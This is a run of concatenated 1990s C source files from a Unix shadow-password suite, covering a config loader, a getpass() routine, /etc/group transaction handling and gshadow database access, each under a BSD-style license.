		 * Locate the slot to save the value.  If this parameter
		 * is unknown then "def_find" will print an err message.
		 */

		if ((d = def_find(name)) == NULL)
			continue;

		/*
		 * Save off the value.
		 */

		if ((d->value = strdup(value)) == NULL) {
			fprintf(stderr,
				"Could not allocate space for config info.\n");
			SYSLOG((LOG_ERR,
				"could not allocate space for config info"));
			break;
		}
	}
	(void) fclose(fp);

	/*
	 * Set the initialized flag.
	 */

	++def_loaded;
}

#ifdef CKDEFS
main(argc, argv)
int	argc;
char	**argv;
{
	int i;
	char *cp;
	struct itemdef *d;

	def_load ();

	for (i = 0 ; i < NUMDEFS ; ++i) {
		if ((d = def_find(def_table[i].name)) == NULL)
			printf("error - lookup '%s' failed\n", def_table[i].name);
		else
			printf("%4d %-24s %s\n", i+1, d->name, d->value);
	}
	for (i = 1;i < argc;i++) {
		if (cp = getdef_str (argv[1]))
			printf ("%s `%s'\n", argv[1], cp);
		else
			printf ("%s not found\n", argv[1]);
	}
	exit(0);
}
#endif
/*
 * Copyright 1990 - 1995, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: getpass.c,v 1.2 1996/09/10 02:45:08 marekm Exp $")

#include "defines.h"

#include <signal.h>
#include <stdio.h>

#if 0  /* XXX */
/*
 * limits.h may be kind enough to specify the length of a prompted
 * for password.
 */

#if defined(__STDC__)
#if __STDC__
#include <limits.h>
#endif
#elif defined(_POSIX_SOURCE)
#include <limits.h>
#endif
#endif  /* XXX */

#ifdef MD5_CRYPT
#define PASS_MAX 127
#endif

/*
 * This is really a giant mess.  On the one hand, it would be nice
 * if PASS_MAX were real big so that DOUBLESIZE isn't needed.  But
 * if it is defined we must honor it because some idiot might use
 * this in a routine expecting some standard behavior.
 */

#ifndef	PASS_MAX
#ifdef	SW_CRYPT
#define	PASS_MAX	80
#else	/* !SW_CRYPT */
#ifdef	SKEY
#define	PASS_MAX	40
#else	/* !SKEY */
#ifdef	DOUBLESIZE
#define	PASS_MAX	16
#else	/* !PASS_MAX */
#define	PASS_MAX	8
#endif	/* DOUBLESIZE */
#endif	/* SKEY */
#endif	/* SW_CRYPT */
#endif	/* !PASS_MAX */

static	int	sig_caught;
#ifdef HAVE_SIGACTION
static	struct	sigaction sigact;
#endif

/*ARGSUSED*/
static RETSIGTYPE
sig_catch (sig)
int	sig;
{
	sig_caught = 1;
}

char *
getpass (prompt)
	const char *prompt;
{
	static	char	input[PASS_MAX+1];
	char	*return_value = 0;
	char	*cp;
	FILE	*fp;
	int	tty_opened = 0;
#ifdef HAVE_SIGACTION
	struct	sigaction old_sigact;
#else
	RETSIGTYPE	(*old_signal)();
#endif
	TERMIO	new_modes;
	TERMIO	old_modes;

	/*
	 * set a flag so the SIGINT signal can be re-sent if it
	 * is caught
	 */

	sig_caught = 0;

	/*
	 * if /dev/tty can't be opened, getpass() needs to read
	 * from stdin instead.
	 */

	if ((fp = fopen ("/dev/tty", "r")) == 0) {
		fp = stdin;
		setbuf (fp, (char *) 0);
	} else {
		tty_opened = 1;
	}

	/*
	 * the current tty modes must be saved so they can be
	 * restored later on.  echo will be turned off, except
	 * for the newline character (BSD has to punt on this)
	 */

	if (GTTY (fileno (fp), &new_modes))
		return 0;

	old_modes = new_modes;
#ifdef HAVE_SIGACTION
	sigact.sa_handler = sig_catch;
	(void) sigaction (SIGINT, &sigact, &old_sigact);
#else
	old_signal = signal (SIGINT, sig_catch);
#endif

#ifdef USE_SGTTY
	new_modes.sg_flags &= ~ECHO ;
#else
	new_modes.c_lflag &= ~(ECHO|ECHOE|ECHOK);
	new_modes.c_lflag |= ECHONL;
#endif

	if (STTY (fileno (fp), &new_modes))
		goto out;

	/*
	 * the prompt is output, and the response read without
	 * echoing.  the trailing newline must be removed.  if
	 * the fgets() returns an error, a NULL pointer is
	 * returned.
	 */

	if (fputs (prompt, stdout) == EOF)
		goto out;

	(void) fflush (stdout);

	if (fgets (input, sizeof input, fp) == input) {
		if ((cp = strchr (input, '\n')))
			*cp = '\0';
		else
			input[sizeof input - 1] = '\0';

		return_value = input;
#ifdef USE_SGTTY
		putc ('\n', stdout);
#endif
	}
out:
	/*
	 * the old SIGINT handler is restored after the tty
	 * modes.  then /dev/tty is closed if it was opened in
	 * the beginning.  finally, if a signal was caught it
	 * is sent to this process for normal processing.
	 */

	if (STTY (fileno (fp), &old_modes))
		return_value = 0;

#ifdef HAVE_SIGACTION
	(void) sigaction (SIGINT, &old_sigact, NULL);
#else
	(void) signal (SIGINT, old_signal);
#endif
	if (tty_opened)
		(void) fclose (fp);

	if (sig_caught) {
		kill (getpid (), SIGINT);
		return_value = 0;
	}

#if 1
	/* Don't return NULL on EOF or SIGINT, breaks too many programs
	   that need to be linked with libshadow.a (screen).  --marekm */

	if (!return_value) {
		input[0] = '\0';
		return_value = input;
	}
#endif
	return return_value;
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	This file implements a transaction oriented group database
 *	library.  The group file is updated one entry at a time.
 *	After each transaction the file must be logically closed and
 *	transferred to the existing group file.  The sequence of
 *	events is
 *
 *	gr_lock				-- lock group file
 *	gr_open				-- logically open group file
 *	while transaction to process
 *		gr_(locate,update,remove) -- perform transaction
 *	done
 *	gr_close			-- commit transactions
 *	gr_unlock			-- remove group lock
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: groupio.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <grp.h>
#include <stdio.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#define NEED_GR_FILE_ENTRY
#include "groupio.h"

static	int	islocked;
static	int	isopen;
static	int	open_modes;
static	FILE	*grfp;

struct	gr_file_entry	*__grf_head;
static	struct	gr_file_entry	*grf_tail;
static	struct	gr_file_entry	*grf_cursor;
int	__gr_changed;
static	int	lock_pid;

#define	GR_LOCK	"/etc/group.lock"
#define	GR_TEMP "/etc/grp.%d"

static	char	gr_filename[BUFSIZ] = GROUP_FILE;

extern	char	*strdup();
extern	struct	group	*sgetgrent();
extern	char	*malloc();
extern	char	*fgetsx();
extern int do_lock_file();
extern FILE *fopen_with_umask();

/*
 * __gr_dup - duplicate a group file entry
 *
 *	__gr_dup() accepts a pointer to a group file entry and
 *	returns a pointer to a group file entry in allocated
 *	memory.
 */

struct group *
__gr_dup (grent)
	const struct group *grent;
{
	struct	group	*gr;
	int	i;

	if (! (gr = (struct group *) malloc (sizeof *gr)))
		return 0;

	if ((gr->gr_name = strdup (grent->gr_name)) == 0 ||
			(gr->gr_passwd = strdup (grent->gr_passwd)) == 0)
		return 0;

	for (i = 0;grent->gr_mem[i];i++)
		;

	if (! (gr->gr_mem = (char **) malloc (sizeof (char *) * (i + 1))))
		return 0;
	for (i = 0;grent->gr_mem[i];i++)
		if (! (gr->gr_mem[i] = strdup (grent->gr_mem[i])))
			return 0;

	gr->gr_mem[i] = 0;
	gr->gr_gid = grent->gr_gid;

	return gr;
}

/*
 * gr_free - free a dynamically allocated group file entry
 *
 *	gr_free() frees up the memory which was allocated for the
 *	pointed to entry.
 */

static void
gr_free (grent)
	const struct group *grent;
{
	int	i;

	free (grent->gr_name);
	free (grent->gr_passwd);

	for (i = 0;grent->gr_mem[i];i++)
		free (grent->gr_mem[i]);

	free ((char *) grent->gr_mem);
}

/*
 * gr_name - change the name of the group file
 */

int
gr_name (name)
	const char *name;
{
	if (isopen || (int) strlen (name) > (BUFSIZ-10))
		return -1;

	strcpy (gr_filename, name);
	return 0;
}

/*
 * gr_lock - lock a group file
 *
 *	gr_lock() encapsulates the lock operation.  it returns
 *	TRUE or FALSE depending on the group file being
 *	properly locked.  the lock is set by creating a semaphore
 *	file, GR_LOCK.
 */

int
gr_lock ()
{
	char	file[BUFSIZ];

	if (islocked)
		return 1;

	if (strcmp (gr_filename, GROUP_FILE) != 0)
		return 0;

	sprintf (file, GR_TEMP, lock_pid = getpid ());

	/*
	 * The rest is common to all four files (see commonio.c).  --marekm
	 */

	if (do_lock_file(file, GR_LOCK)) {
		islocked = 1;
		return 1;
	}

	return 0;
}

/*
 * gr_unlock - logically unlock a group file
 *
 *	gr_unlock() removes the lock which was set by an earlier
 *	invocation of gr_lock().
 */

int
gr_unlock ()
{
	if (isopen) {
		open_modes = O_RDONLY;
		if (! gr_close ())
			return 0;
	}
	if (islocked) {
		islocked = 0;
		if (lock_pid != getpid ())
			return 0;

		(void) unlink (GR_LOCK);
		return 1;
	}
	return 0;
}

/*
 * gr_open - open a group file
 *
 *	gr_open() encapsulates the open operation.  it returns
 *	TRUE or FALSE depending on the group file being
 *	properly opened.
 */

int
gr_open(mode)
	int mode;
{
	char	buf[8192];
	char	*cp;
	struct	gr_file_entry	*grf;
	struct	group	*grent;

	if (isopen || (mode != O_RDONLY && mode != O_RDWR))
		return 0;

	if (mode != O_RDONLY && ! islocked &&
			strcmp (gr_filename, GROUP_FILE) == 0)
		return 0;

	if ((grfp = fopen (gr_filename, mode == O_RDONLY ? "r":"r+")) == 0)
		return 0;

	__grf_head = grf_tail = grf_cursor = 0;
	__gr_changed = 0;

	while (fgetsx (buf, sizeof buf, grfp) != (char *) 0) {
		if ((cp = strrchr (buf, '\n')))
			*cp = '\0';

		if (! (grf = (struct gr_file_entry *) malloc (sizeof *grf)))
			goto fail;

		grf->grf_changed = 0;
		if (! (grf->grf_line = strdup (buf)))
			goto fail;
		if ((grent = sgetgrent (buf)) && ! (grent = __gr_dup (grent)))
			goto fail;

		grf->grf_entry = grent;

		if (__grf_head == 0) {
			__grf_head = grf_tail = grf;
			grf->grf_next = 0;
		} else {
			grf_tail->grf_next = grf;
			grf->grf_next = 0;
			grf_tail = grf;
		}
	}
	isopen++;
	open_modes = mode;

	return 1;

fail:
	fclose(grfp);
	return 0;
}

/*
 * gr_close - close the group file
 *
 *	gr_close() outputs any modified group file entries and
 *	frees any allocated memory.
 */

int
gr_close ()
{
	char	backup[BUFSIZ];
	char	newfile[BUFSIZ];
	int	errors = 0;
	struct	gr_file_entry *grf;
	struct	stat	sb;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (islocked && lock_pid != getpid ()) {
		isopen = 0;
		islocked = 0;
		errno = EACCES;
		return 0;
	}
	strcpy (backup, gr_filename);
	strcat (backup, "-");
	strcpy (newfile, gr_filename);
	strcat (newfile, "+");

	/*
	 * Create a backup copy of the group file.
	 */

	if (open_modes == O_RDWR && __gr_changed) {

		/*
		 * POLICY: /etc/group
		 * Any backup copy of the group file shall have the
		 * same protections as the original.
		 *
		 * Get the permissions from the old file and apply them
		 * to the backup file.
		 */

		if (fstat (fileno (grfp), &sb))
			return 0;

		if (create_backup_file(grfp, backup, &sb))
			return 0;

		isopen = 0;
		(void) fclose (grfp);

		/*
		 * POLICY: /etc/group
		 * The group file shall allow write access to
		 * privileged users only.  The group file shall allow
		 * read access to all users.
		 *
		 * The group file is opened with no access permissions
		 * to any user.  This allows the file to be changed to
		 * root ownership and then made readable by all users
		 * without ever giving any unprivileged user write access.
		 */

		grfp = fopen_with_umask(newfile, "w", 0777);
		if (!grfp)
			return 0;
		if (chown(newfile, sb.st_uid, sb.st_gid) ||
		    chmod(newfile, sb.st_mode))
			return 0;

		/*
		 * Check each member in the list and write out any elements
		 * that have been changed.
		 */

		for (grf = __grf_head;! errors && grf;grf = grf->grf_next) {
			if (grf->grf_changed) {
				if (putgrent (grf->grf_entry, grfp))
					errors++;
			} else {
				if (fputsx (grf->grf_line, grfp))
					errors++;

				if (putc ('\n', grfp) == EOF)
					errors++;
			}
		}
		if (fflush (grfp))
			errors++;
		if (fclose (grfp))
			errors++;

		if (errors) {
			unlink (newfile);
			return 0;
		}

		/*
		 * POLICY: /etc/group
		 * The group file shall be consistent at all times.
		 *
		 * The new group file is moved into place only after
		 * determining that the file was created without any
		 * errors occuring.
		 */

		if (rename (newfile, gr_filename))
			return 0;
		sync();
	} else
		/*
		 * Just close the file -- there was nothing to change
		 */

		fclose (grfp);

	grfp = 0;

	/*
	 * Free up all of the memory in the linked list.
	 */

	while (__grf_head != 0) {
		grf = __grf_head;
		__grf_head = grf->grf_next;

		if (grf->grf_entry) {
			gr_free (grf->grf_entry);
			free ((char *) grf->grf_entry);
		}
		if (grf->grf_line)
			free (grf->grf_line);

		free ((char *) grf);
	}
	grf_tail = 0;
	isopen = 0;
	return 1;
}

int
gr_update (grent)
	const struct group *grent;
{
	struct	gr_file_entry	*grf;
	struct	group	*ngr;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (grf = __grf_head;grf != 0;grf = grf->grf_next) {
		if (grf->grf_entry == 0)
			continue;

		if (strcmp (grent->gr_name, grf->grf_entry->gr_name) != 0)
			continue;

		if (! (ngr = __gr_dup (grent)))
			return 0;

		gr_free (grf->grf_entry);
		*(grf->grf_entry) = *ngr;

		grf->grf_changed = 1;
		grf_cursor = grf;
		return __gr_changed = 1;
	}
	if (! (grf = (struct gr_file_entry *) malloc (sizeof *grf)))
		return 0;
	if (! (grf->grf_entry = __gr_dup (grent)))
		return 0;

	grf->grf_changed = 1;
	grf->grf_next = 0;
	grf->grf_line = 0;

	if (grf_tail)
		grf_tail->grf_next = grf;

	if (! __grf_head)
		__grf_head = grf;

	grf_tail = grf;

	return __gr_changed = 1;
}

int
gr_remove (name)
	const char *name;
{
	struct	gr_file_entry	*grf;
	struct	gr_file_entry	*ogrf;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (ogrf = 0, grf = __grf_head;grf != 0;
			ogrf = grf, grf = grf->grf_next) {
		if (! grf->grf_entry)
			continue;

		if (strcmp (name, grf->grf_entry->gr_name) != 0)
			continue;

		if (grf == grf_cursor)
			grf_cursor = ogrf;

		if (ogrf != 0)
			ogrf->grf_next = grf->grf_next;
		else
			__grf_head = grf->grf_next;

		if (grf == grf_tail)
			grf_tail = ogrf;

		return __gr_changed = 1;
	}
	errno = ENOENT;
	return 0;
}

const struct group *
gr_locate (name)
	const char *name;
{
	struct	gr_file_entry	*grf;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	for (grf = __grf_head;grf != 0;grf = grf->grf_next) {
		if (grf->grf_entry == 0)
			continue;

		if (strcmp (name, grf->grf_entry->gr_name) == 0) {
			grf_cursor = grf;
			return grf->grf_entry;
		}
	}
	errno = ENOENT;
	return 0;
}

int
gr_rewind ()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	grf_cursor = 0;
	return 1;
}

const struct group *
gr_next ()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (grf_cursor == 0)
		grf_cursor = __grf_head;
	else
		grf_cursor = grf_cursor->grf_next;

	while (grf_cursor) {
		if (grf_cursor->grf_entry)
			return grf_cursor->grf_entry;

		grf_cursor = grf_cursor->grf_next;
	}
	return 0;
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

/* Newer versions of Linux libc already have shadow support.  */
#if defined(SHADOWGRP) && !defined(HAVE_SHADOWGRP)	/*{*/

#include "rcsid.h"
RCSID("$Id: gshadow.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include "prototypes.h"
#include "defines.h"

#ifdef	NDBM
#include <ndbm.h>
#include <fcntl.h>
DBM	*sg_dbm;
int	sg_dbm_mode = -1;
static	int	dbmopened;
static	int	dbmerror;
#endif

#define	MAXMEM	1024

static	FILE	*shadow;
static	char	sgrbuf[BUFSIZ*4];
static	char	*members[MAXMEM+1];
static	char	*admins[MAXMEM+1];
static	struct	sgrp	sgroup;

extern	char	*fgetsx();
extern	int	fputsx();

#define	FIELDS	4

#ifdef	USE_NIS
static	int	nis_used;
static	int	nis_ignore;
static	enum	{ native, start, middle, native2 } nis_state;
static	int	nis_bound;
static	char	*nis_domain;
static	char	*nis_key;
static	int	nis_keylen;
static	char	*nis_val;
static	int	nis_vallen;
#define	IS_NISCHAR(c) ((c)=='+')
#endif

#ifdef	USE_NIS

/*
 * __setsgNIS - turn on or off NIS searches
 */

void
__setsgNIS (flag)
int	flag;
{
	nis_ignore = ! flag;

	if (nis_ignore)
		nis_used = 0;
}

/*
 * bind_nis - bind to NIS server
 */

static int
bind_nis ()
{
	if (yp_get_default_domain (&nis_domain))
		return -1;

	nis_bound = 1;
	return 0;
}
#endif

static char **
list (s, l)
char	*s;
char	**l;
{
	int	nmembers = 0;

	while (s && *s) {
		l[nmembers++] = s;
		if ((s = strchr (s, ',')))
			*s++ = '\0';
	}
	l[nmembers] = (char *) 0;
	return l;
}

void
setsgent ()
{
#ifdef	NDBM
	int	mode;
#endif	/* NDBM */

#ifdef	USE_NIS
	nis_state = native;
#endif
	if (shadow)
		rewind (shadow);
	else
		shadow = fopen(SGROUP_FILE, "r");

	/*
	 * Attempt to open the DBM files if they have never been opened
	 * and an error has never been returned.
	 */

#ifdef NDBM
	if (! dbmerror && ! dbmopened) {
		char	dbmfiles[BUFSIZ];

		strcpy (dbmfiles, SGROUP_PAG_FILE);

		if (sg_dbm_mode == -1)
			mode = O_RDWR;
		else
			mode = (sg_dbm_mode == O_RDWR) ? O_RDWR:O_RDONLY;

		if (access (dbmfiles, 0) ||
			(! (sg_dbm = dbm_open(SGROUP_FILE, mode, 0))))
			dbmerror = 1;
		else
			dbmopened = 1;
	}
#endif	/* NDBM */
}

void
endsgent ()
{
	if (shadow)
		(void) fclose (shadow);

	shadow = (FILE *) 0;
#ifdef	NDBM
	if (dbmopened && sg_dbm) {
		dbm_close (sg_dbm);
		dbmopened = 0;
		sg_dbm = 0;
	}
#endif
}

struct sgrp *
sgetsgent (string)
	const char *string;
{
	char	*fields[FIELDS];
	char	*cp;
	int	i;

	strncpy (sgrbuf, string, (int) sizeof sgrbuf - 1);
	sgrbuf[sizeof sgrbuf - 1] = '\0';

	if ((cp = strrchr (sgrbuf, '\n')))
		*cp = '\0';

	/*
	 * There should be exactly 4 colon separated fields.  Find
	 * all 4 of them and save the starting addresses in fields[].
	 */

	for (cp = sgrbuf, i = 0;i < FIELDS && cp;i++) {
		fields[i] = cp;
		if ((cp = strchr (cp, ':')))
			*cp++ = '\0';
	}

	/*
	 * If there was an extra field somehow, or perhaps not enough,
	 * the line is invalid.
	 */

	if (cp || i != FIELDS)
#ifdef	USE_NIS
		if (! IS_NISCHAR (fields[0][0]))
			return 0;
		else
			nis_used = 1;
#else
		return 0;
#endif

	sgroup.sg_name = fields[0];
	sgroup.sg_passwd = fields[1];
	sgroup.sg_adm = list (fields[2], admins);
	sgroup.sg_mem = list (fields[3], members);

	return &sgroup;
}

/*
 * fgetsgent - convert next line in stream to (struct sgrp)
 *
 * fgetsgent() reads the next line from the provided stream and
 * converts it to a (struct sgrp).  NULL is returned on EOF.
 */

struct sgrp
*fgetsgent (fp)
FILE	*fp;
{
	char	buf[sizeof sgrbuf];
	char	*cp;

	if (! fp)
		return (0);

#ifdef	USE_NIS
	while (fgetsx (buf, sizeof buf, fp) != (char *) 0)
#else
	if (fgetsx (buf, sizeof buf, fp) != (char *) 0)
#endif
	{
		if ((cp = strchr (buf, '\n')))
			*cp = '\0';
#ifdef	USE_NIS
		if (nis_ignore && IS_NISCHAR (buf[0]))
			continue;
#endif
		return (sgetsgent (buf));
	}
	return 0;
}

/*
 * getsgent - get a single shadow group entry
 */

struct sgrp
*getsgent ()
{
#ifdef	USE_NIS
	int	nis_1_group = 0;
	struct	sgrp	*val;
	char	buf[BUFSIZ];
#endif
	if (! shadow)
		setsgent ();

#ifdef	USE_NIS
again:
	/*
	 * See if we are reading from the local file.
	 */

	if (nis_state == native || nis_state == native2) {

		/*
		 * Get the next entry from the shadow group file.  Return
		 * NULL right away if there is none.
		 */

		if (! (val = fgetsgent (shadow)))
			return 0;

		/*
		 * If this entry began with a NIS escape character, we have
		 * to see if this is just a single group, or if the entire
		 * map is being asked for.
		 */

		if (IS_NISCHAR (val->sg_name[0])) {
			if (val->sg_name[1])
				nis_1_group = 1;
			else
				nis_state = start;
		}

		/*
		 * If this isn't a NIS group and this isn't an escape to go
		 * use a NIS map, it must be a regular local group.
		 */

		if (nis_1_group == 0 && nis_state != start)
			return val;

		/*
		 * If this is an escape to use an NIS map, switch over to
		 * that bunch of code.
		 */

		if (nis_state == start)
			goto again;

		/*
		 * NEEDSWORK.  Here we substitute pieces-parts of this entry.
		 */

		return 0;
	} else {
		if (nis_bound == 0) {
			if (bind_nis ()) {
				nis_state = native2;
				goto again;
			}
		}
		if (nis_state == start) {
			if (yp_first (nis_domain, "gshadow.byname", &nis_key,
				&nis_keylen, &nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
			nis_state = middle;
		} else if (nis_state == middle) {
			if (yp_next (nis_domain, "gshadow.byname", nis_key,
				nis_keylen, &nis_key, &nis_keylen,
				&nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
		}
		return sgetsgent (nis_val);
	}
#else
	return (fgetsgent (shadow));
#endif
}

/*
 * getsgnam - get a shadow group entry by name
 */

struct sgrp *
getsgnam (name)
	const char *name;
{
	struct	sgrp	*sgrp;
#ifdef NDBM
	datum	key;
	datum	content;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	setsgent ();

#ifdef NDBM

	/*
	 * If the DBM file are now open, create a key for this group and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		key.dsize = strlen (name);
		key.dptr = (void *) name;

		content = dbm_fetch (sg_dbm, key);
		if (content.dptr != 0) {
			memcpy (sgrbuf, content.dptr, content.dsize);
			sgroup.sg_mem = members;
			sgroup.sg_adm = admins;
			sgr_unpack (sgrbuf, content.dsize, &sgroup);
			return &sgroup;
		}
	}
#endif
#ifdef	USE_NIS
	if (nis_used) {
again:

		/*
		 * Search the gshadow.byname map for this group.
		 */

		if (! nis_bound)
			bind_nis ();

		if (nis_bound) {
			char	*cp;

			if (yp_match (nis_domain, "gshadow.byname", name,
					strlen (name), &nis_val, &nis_vallen) == 0) {
				if (cp = strchr (nis_val, '\n'))
					*cp = '\0';

				nis_state = middle;
				if (sgrp = sgetsgent (nis_val)) {
					strcpy (save_name, sgrp->sg_name);
					nis_key = save_name;
					nis_keylen = strlen (save_name);
				}
				return sgrp;
			}
		}
		nis_state = native2;
	}
#endif
#ifdef	USE_NIS
	if (nis_used) {
		nis_ignore++;
		nis_disabled++;
	}
#endif
	while ((sgrp = getsgent ()) != (struct sgrp *) 0) {
		if (strcmp (name, sgrp->sg_name) == 0)
			break;
	}
#ifdef	USE_NIS
	nis_ignore--;
#endif
	if (sgrp)
		return sgrp;
	return (0);
}

/*
 * putsgent - output shadow group entry in text form
 *
 * putsgent() converts the contents of a (struct sgrp) to text and
 * writes the result to the given stream.  This is the logical
 * opposite of fgetsgent.
 */

int
putsgent (sgrp, fp)
	const struct sgrp *sgrp;
	FILE	*fp;
{
	char	buf[sizeof sgrbuf];
	char	*cp = buf;
	int	i;

	if (! fp || ! sgrp)
		return -1;

	/*
	 * Copy the group name and passwd.
	 */

	strcpy (cp, sgrp->sg_name);
	cp += strlen (cp);
	*cp++ = ':';

	strcpy (cp, sgrp->sg_passwd);
	cp += strlen (cp);
	*cp++ = ':';

	/*
	 * Copy the administrators, separating each from the other
	 * with a ",".
	 */

	for (i = 0;sgrp->sg_adm[i];i++) {
		if (i > 0)
			*cp++ = ',';

		strcpy (cp, sgrp->sg_adm[i]);
		cp += strlen (cp);
	}
	*cp++ = ':';

	/*
	 * Now do likewise with the group members.
	 */

	for (i = 0;sgrp->sg_mem[i];i++) {
		if (i > 0)
			*cp++ = ',';

		strcpy (cp, sgrp->sg_mem[i]);
		cp += strlen (cp);
	}
	*cp++ = '\n';
	*cp = '\0';

	/*
	 * Output using the function which understands the line
	 * continuation conventions.
	 */

	return fputsx (buf, fp);
}

#endif	/*} SHADOWGRP */
/*
 * Copyright 1992, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
